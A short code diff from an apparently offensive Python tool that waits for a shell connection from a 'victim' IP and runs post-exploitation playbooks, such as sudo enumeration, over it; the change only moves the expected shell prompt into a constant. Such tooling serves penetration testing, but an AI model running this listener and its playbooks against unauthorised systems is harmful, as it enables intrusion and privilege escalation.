@@ -7,6 +7,8 @@ import playbooks.enumerate.sudo_list
 import pwnlib_socket_wrapper
 import utilities
 
+EXPECTED_PROMPT = b'$ '
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-v', '--victim_ip', required=True)
@@ -26,7 +28,7 @@ def main():
     pwn.context.log_level = 'error'
     with pwn.listen(args.port).wait_for_connection() as client:
         print('Connected!')
-        shell = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, b'$ ', attacker_ip)
+        shell = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, EXPECTED_PROMPT, attacker_ip)
 
         for playbook in active_playbooks:
             shell.run_playbook(playbook)
